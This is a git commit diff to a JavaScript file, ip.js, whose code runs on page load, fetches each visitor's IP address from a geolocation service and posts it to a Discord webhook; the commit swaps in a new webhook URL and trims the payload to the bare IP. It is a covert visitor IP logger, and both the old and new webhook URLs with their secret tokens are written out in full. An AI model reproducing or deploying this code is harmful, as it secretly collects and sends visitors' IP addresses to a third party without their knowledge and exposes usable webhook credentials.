0eeadbbf2c22acd05b7e6d813a11c619965d9d3a
TbeyazT <119758439+TbeyazT@users.noreply.github.com>
2024-01-03 15:33:51 +0300

    Update ip.js

--- ip.js
+++ ip.js
@@ -3,11 +3,11 @@ $(document).ready(function() {
     $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {  
       // Send IP information to Discord webhook
       var ipAddress = data.ip; // Extract the IP address from the response object
-      var discordWebhookURL = 'https://discord.com/api/webhooks/1177616745528316004/4QMe0_alxXPFjJEIUga796AFTdNmMTNeqlJrJylrmUAmah7GhDfsEi2oWbS-Jj2JpStk';
+      var discordWebhookURL = 'https://discord.com/api/webhooks/1192081670581534830/P9uYgvlHMz-LUXjAjqD-XrvuG0ruL-Hcp-6gWxo5LKJJMaHyedDZQ-HHkHVsnoTQK3wt';
     
       // Create the payload to send to Discord
       var discordPayload = {
-        content: 'Visited IP: ' + JSON.stringify(data, null, 2)
+        content: 'Visited IP: ' + ipAddress
       };
 
       console.log(JSON.stringify(data, null, 2));
